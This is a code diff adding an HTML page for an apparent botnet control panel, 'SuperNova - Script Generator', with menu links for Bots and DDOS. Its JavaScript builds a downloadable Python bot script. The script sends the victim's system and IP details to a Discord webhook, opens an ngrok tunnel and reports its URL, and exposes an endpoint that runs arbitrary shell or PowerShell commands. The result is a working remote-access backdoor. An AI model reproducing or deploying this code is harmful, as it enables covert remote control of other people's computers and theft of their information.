@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Favicon -->
+    <link rel="icon" href="{{ url_for('static', filename='icon.png') }}" type="image/png">
+
+    <!-- Character Set and Viewport -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>SuperNova - Script Generator</title>
+
+    <!-- jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+            position: relative;
+        }
+
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #5cb85c;
+            outline: none;
+        }
+
+        button {
+            padding: 10px 15px;
+            background-color: #5cb85c;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #4cae4c;
+        }
+
+        /* Dropdown Styles */
+        .dropdown {
+            position: absolute;
+            top: 10px;
+            right: 120px;
+        }
+
+        .dropbtn {
+            background-color: #5cb85c;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .dropbtn:hover {
+            background-color: #4cae4c;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #f9f9f9;
+            min-width: 160px;
+            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            z-index: 1;
+            border-radius: 4px;
+        }
+
+        .dropdown-content a {
+            color: black;
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+            transition: background-color 0.3s;
+        }
+
+        .dropdown-content a:hover {
+            background-color: #f1f1f1;
+        }
+
+        .show {
+            display: block;
+        }
+
+        img {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Script Generator</h1>
+    <img rel="image" src="{{ url_for('static', filename='icon.png') }}">
+
+    <form id="scriptForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="hook_url">Discord Webhook URL:</label>
+        <input type="text" id="hook_url" name="hook_url" required>
+
+        <button type="submit">Generate Script</button>
+    </form>
+
+    <div class="dropdown">
+        <button class="dropbtn" onclick="toggleDropdown()">Options</button>
+        <div id="myDropdown" class="dropdown-content">
+            <a href="#" onclick="navigateTo('/bots')">Bots</a>
+            <a href="#" onclick="navigateTo('/DDOS')">DDOS</a>
+            <a href="#" onclick="navigateTo('/status')">Status Codes</a>
+            <a href="#">Option 4</a>
+        </div>
+    </div>
+
+    <script>
+        // Function to toggle dropdown
+        function toggleDropdown() {
+            document.getElementById("myDropdown").classList.toggle("show");
+        }
+
+        // Function to navigate to a new page
+        function navigateTo(url) {
+            window.location.href = url; // Redirect to the new URL
+        }
+
+        // Close the dropdown if the user clicks outside of it
+        window.onclick = function(event) {
+            if (!event.target.matches('.dropbtn')) {
+                var dropdowns = document.getElementsByClassName("dropdown-content");
+                for (var i = 0; i < dropdowns.length; i++) {
+                    var openDropdown = dropdowns[i];
+                    if (openDropdown.classList.contains('show')) {
+                        openDropdown.classList.remove('show');
+                    }
+                }
+            }
+        }
+
+        document.getElementById("scriptForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const hook_url = document.getElementById("hook_url").value;
+
+            const scriptContent = `
+from flask import Flask, request, jsonify
+import json
+import socket
+import os
+import platform
+import requests
+import subprocess
+import time
+from dhooks import Webhook
+import signal
+import sys
+
+app = Flask(__name__)
+
+if platform.system() == 'Linux':
+    os.system("clear")
+else:
+    os.system("cls")
+
+username = "${username}"
+hook_url = "${hook_url}"
+hook = Webhook(hook_url)
+
+current_directory = os.getcwd()
+
+def start_ngrok():
+    ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    hook.send("Waiting for ngrok to start...")
+    time.sleep(10)
+
+    try:
+        response = requests.get('http://localhost:4040/api/tunnels')
+        tunnels = response.json().get('tunnels', [])
+        if tunnels:
+            public_url = tunnels[0]['public_url']
+            hook.send(f"Public URL: {public_url}")
+            return public_url, ngrok_process
+        else:
+            hook.send("No tunnels found.")
+            ngrok_process.terminate()
+            return None, ngrok_process
+    except Exception as e:
+        hook.send(f"Error retrieving public URL: {e}")
+        ngrok_process.terminate()
+        return None, ngrok_process
+
+def gather_system_info():
+    response = requests.get("http://ip-api.com/json/?fields=61439")
+    ip_data = response.json()
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+
+    public_ip = ip_data.get('query', 'N/A')
+    
+    system_data = platform.uname()
+    system_info = {
+        "Node": system_data.node,
+        "System": system_data.system,
+        "Machine": system_data.machine,
+        "Release": system_data.release,
+        "Version": system_data.version,
+        "Local IP": local_ip
+    }
+    
+    hook.send(f"System Info: {json.dumps(system_info, indent=4)}")
+    hook.send(f"IP Info: {json.dumps(ip_data, indent=4)}")
+    return public_ip, ip_data, system_info
+
+gather_system_info()
+ngrok_url, ngrok_process = start_ngrok()
+time.sleep(5)
+
+@app.route('/execute', methods=['POST'])
+def execute_command():
+    data = request.get_json()
+    command = data.get('command', '')
+
+    global current_directory
+
+    try:
+        if command.lower().startswith("cd "):
+            new_dir = command.split(" ", 1)[1]
+            try:
+                os.chdir(new_dir)
+                current_directory = os.getcwd()
+                return jsonify({'result': f"Changed directory to {current_directory}"})
+            except FileNotFoundError:
+                return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
+            except PermissionError:
+                return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
+
+        if platform.system() == 'Windows':
+            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
+        else:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
+        
+        output = result.stdout if result.returncode == 0 else result.stderr
+        return jsonify({'result': output})
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/update_username', methods=['POST'])
+def update_username():
+    global username
+    new_username = request.json.get('username')
+    if new_username:
+        username = new_username
+        return jsonify({"message": "Username updated", "new_username": username}), 200
+    return jsonify({"message": "Username not provided"}), 400
+
+@app.route('/get_username', methods=['GET'])
+def get_username():
+    return jsonify({"username": username}), 200
+
+def cleanup(signum, frame):
+    hook.send(f"{username} is offline.")
+    ngrok_process.terminate()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, cleanup)
+signal.signal(signal.SIGTERM, cleanup)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+`;
+
+            const blob = new Blob([scriptContent], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'Bot_script.py';
+            link.click();
+        });
+    </script>
+</body>
+</html>
